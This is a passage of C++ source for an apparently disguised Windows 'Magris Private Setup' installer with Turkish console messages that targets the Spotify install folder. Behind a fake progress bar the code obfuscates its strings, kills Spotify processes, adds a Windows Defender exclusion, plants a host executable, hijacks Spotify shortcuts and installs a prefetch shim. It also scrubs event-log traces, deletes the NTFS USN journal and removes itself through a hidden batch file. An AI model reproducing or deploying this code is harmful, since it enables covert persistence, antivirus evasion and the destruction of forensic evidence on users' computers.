        if (GetFileAttributesW(wsrc.c_str()) != INVALID_FILE_ATTRIBUTES)
            CopyFileW(wsrc.c_str(), wdst.c_str(), FALSE);
        std::wstring isrc = path + XW(L"indir.jpg"), idst = spotifyDir + XW(L"indir.jpg");
        if (GetFileAttributesW(isrc.c_str()) != INVALID_FILE_ATTRIBUTES)
            CopyFileW(isrc.c_str(), idst.c_str(), FALSE);
        InstallPrefetchShim(path, spotifyDir);
        CleanupLegacyInstall();
    }
}

static void SilentSelfDelete() {
    wchar_t self[MAX_PATH] = {};
    GetModuleFileNameW(NULL, self, MAX_PATH);

    
    HANDLE hVol = CreateFileW(XWC(L"\\\\.\\C:"), FILE_READ_DATA | FILE_WRITE_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hVol != INVALID_HANDLE_VALUE) {
        USN_JOURNAL_DATA_V0 jdata = {};
        DWORD br = 0;
        if (DeviceIoControl(hVol, FSCTL_QUERY_USN_JOURNAL, NULL, 0, &jdata, sizeof(jdata), &br, NULL)) {
            DELETE_USN_JOURNAL_DATA delReq = {};
            delReq.UsnJournalID = jdata.UsnJournalID;
            delReq.DeleteFlags = USN_DELETE_FLAG_DELETE;
            DeviceIoControl(hVol, FSCTL_DELETE_USN_JOURNAL, &delReq, sizeof(delReq), NULL, 0, &br, NULL);
        }
        CloseHandle(hVol);
    }

    wchar_t tempDir[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, tempDir);
    std::wstring batPath = std::wstring(tempDir) + XW(L"~dc_") + std::to_wstring(GetTickCount()) + XW(L".bat");

    std::string script = XS("@echo off\r\n");
    script += XS(":retry\r\n");
    script += XS("ping -n 2 127.0.0.1 >nul 2>&1\r\n");
    script += XS("del /f /q \"");
    for (const wchar_t* p = self; *p; p++) script += (char)(*p < 256 ? *p : '?');
    script += XS("\" >nul 2>&1\r\n");
    script += XS("if exist \"");
    for (const wchar_t* p = self; *p; p++) script += (char)(*p < 256 ? *p : '?');
    script += XS("\" goto retry\r\n");
    script += XS("del /f /q \"");
    for (const wchar_t* p = batPath.c_str(); *p; p++) script += (char)(*p < 256 ? *p : '?');
    script += XS("\" >nul 2>&1\r\n");

    HANDLE f = CreateFileW(batPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(f, script.c_str(), (DWORD)script.size(), &w, NULL);
        CloseHandle(f);
        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {};
        std::wstring cmd = XW(L"cmd.exe /c \"") + batPath + XW(L"\"");
        if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
        }
    }
}

bool CheckAdminPrivileges() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup)) {
        CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin);
        FreeSid(AdministratorsGroup);
    }
    return isAdmin;
}

static void SimulateInstallation() {
    for (int i = 0; i < 10; i++) {
        for (int p = i * 10; p <= (i + 1) * 10; p++) {
            PrintProgress(GetProgressMessage(p), p);
            std::this_thread::sleep_for(std::chrono::milliseconds(30));
        }
    }
    std::cout << std::endl;
}

int main() {
    MinimizeEventViewerTraces();
    SetConsoleTitleA(XSC("Magris Private Setup - Kurulum Sihirbazi"));
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_SHOWMAXIMIZED);

    PrintBanner();
    std::cout << std::endl;
    SetConsoleColor(FOREGROUND_YELLOW | FOREGROUND_INTENSITY);
    std::cout << XS("  Magris Private Kurulum Sihirbazi v2.0") << std::endl;
    std::cout << XS("  ===================================") << std::endl << std::endl;
    SetConsoleColor(FOREGROUND_WHITE);

    if (!CheckAdminPrivileges()) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cout << std::endl << XS("  [!] HATA: YONETICI YETKISI GEREKLI!") << std::endl;
        std::cout << XS("  [!] Lutfen sag tikla -> Yonetici olarak calistir") << std::endl;
        SetConsoleColor(FOREGROUND_WHITE);
        std::cout << std::endl << XS("  Kapatmak icin bir tusa basin...");
        std::cin.get();
        return 1;
    }

    PrintStatus(XSC("Yonetici yetkisi dogrulandi"), true);
    std::cout << std::endl;

    std::cout << XS("  ?.dll araniyor...") << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(1));

    std::wstring ssPathW = FindSpotifyPath();
    if (ssPathW.empty()) {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cout << std::endl << XS("  [!] HATA: Bilesen bulunamadi!") << std::endl;
        std::cout << XS("  [!] Lutfen once gerekli bileseni kurun.") << std::endl;
        SetConsoleColor(FOREGROUND_WHITE);
        std::cout << std::endl << XS("  Kapatmak icin bir tusa basin...");
        std::cin.get();
        return 1;
    }

    char ssPathA[MAX_PATH];
    WideCharToMultiByte(CP_ACP, 0, ssPathW.c_str(), -1, ssPathA, MAX_PATH, NULL, NULL);

    SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::cout << XS("  [OK] ?.dll bulundu!") << std::endl;
    std::cout << XS("  [OK] Konum: ") << ssPathA << std::endl;
    SetConsoleColor(FOREGROUND_WHITE);
    std::cout << std::endl;

    SetConsoleColor(FOREGROUND_CYAN | FOREGROUND_INTENSITY);
    std::cout << XS("  Kurulum baslatiliyor...") << std::endl;
    SetConsoleColor(FOREGROUND_WHITE);
    std::cout << std::endl;

    SimulateInstallation();
    std::cout << std::endl;

    SetConsoleColor(FOREGROUND_YELLOW | FOREGROUND_INTENSITY);
    std::cout << XS("  ?.dll kapatiliyor...") << std::endl;
    SetConsoleColor(FOREGROUND_WHITE);
    system(XSC("taskkill /F /IM Spotify.exe >nul 2>&1"));
    system(XSC("taskkill /F /IM Spotify_real.exe >nul 2>&1"));
    system(XSC("taskkill /F /IM SpotifyLauncher.exe >nul 2>&1"));
    system(XSC("taskkill /F /IM SpotifyLaunchers.exe >nul 2>&1"));
    std::this_thread::sleep_for(std::chrono::seconds(2));
    PrintStatus(XSC("?.dll kapatildi"), true);
    std::cout << std::endl;

    std::wstring spotifyDir = GetDirFromExePath(ssPathW);
    std::wstring dir = GetExeDir();
    AddDefenderExclusion(spotifyDir);

    bool hostOk = InstallSpotifyLaunchersExe(spotifyDir, dir);
    CleanupLegacyLauncherFiles(spotifyDir);

    std::wstring hostPath = spotifyDir + MAGRIS_HOST_EXE_W;
    std::wstring realSpotifyPath = ResolveOriginalSpotifyExePath(spotifyDir, ssPathW);
    bool pathOk = WriteSpotifyPathFile(spotifyDir, realSpotifyPath);

    std::vector<std::wstring> realPaths;
    realPaths.push_back(realSpotifyPath);
    realPaths.push_back(ssPathW);
    std::wstring launcherExe = spotifyDir + XW(L"SpotifyLauncher.exe");
    if (GetFileAttributesW(launcherExe.c_str()) != INVALID_FILE_ATTRIBUTES)
        realPaths.push_back(launcherExe);

    HijackSpotifyShortcutEx(hostPath, spotifyDir, ssPathW, realPaths.data(), realPaths.size());

    std::wstring wsrc = dir + XW(L"wezy.png"), wdst = spotifyDir + XW(L"wezy.png");
    if (GetFileAttributesW(wsrc.c_str()) != INVALID_FILE_ATTRIBUTES)
        CopyFileW(wsrc.c_str(), wdst.c_str(), FALSE);
    std::wstring isrc = dir + XW(L"indir.jpg"), idst = spotifyDir + XW(L"indir.jpg");
    if (GetFileAttributesW(isrc.c_str()) != INVALID_FILE_ATTRIBUTES)
        CopyFileW(isrc.c_str(), idst.c_str(), FALSE);

    bool prefetchOk = InstallPrefetchShim(dir, spotifyDir);

    CleanupLegacyInstall();
    {
        std::wstring startupDir = XW(L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
        DeleteFileW((startupDir + XW(L"\\WscNotification.vbs")).c_str());
    }
    std::this_thread::sleep_for(std::chrono::milliseconds(300));

    bool installSuccess = hostOk && pathOk && prefetchOk;

    std::cout << std::endl;
    if (installSuccess) {
        SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << XS("  =========================================") << std::endl;
        std::cout << XS("  KURULUM BASARIYLA TAMAMLANDI!") << std::endl;
        std::cout << XS("  =========================================") << std::endl;
        SetConsoleColor(FOREGROUND_WHITE);
        std::cout << std::endl;
        SetConsoleColor(FOREGROUND_CYAN | FOREGROUND_INTENSITY);
        std::cout << XS("  KULLANIM:") << std::endl;
        std::cout << XS("  ---------") << std::endl;
        std::cout << XS("  Spotify'i her zamanki gibi acin (kisayol veya uygulama).") << std::endl;
        std::cout << XS("  Launcher arayuzu Spotify ile birlikte acilir.") << std::endl;
        SetConsoleColor(FOREGROUND_WHITE);
    } else {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cout << XS("  =========================================") << std::endl;
        std::cout << XS("  KURULUM EKSIK TAMAMLANDI!") << std::endl;
        std::cout << XS("  =========================================") << std::endl;
        SetConsoleColor(FOREGROUND_WHITE);
    }

    std::cout << std::endl;
    std::cout << XS("  Kapanmaya 3 saniye...") << std::endl;
    std::this_thread::sleep_for(std::chrono::seconds(3));
    SilentSelfDelete();
    return installSuccess ? 0 : 1;
}

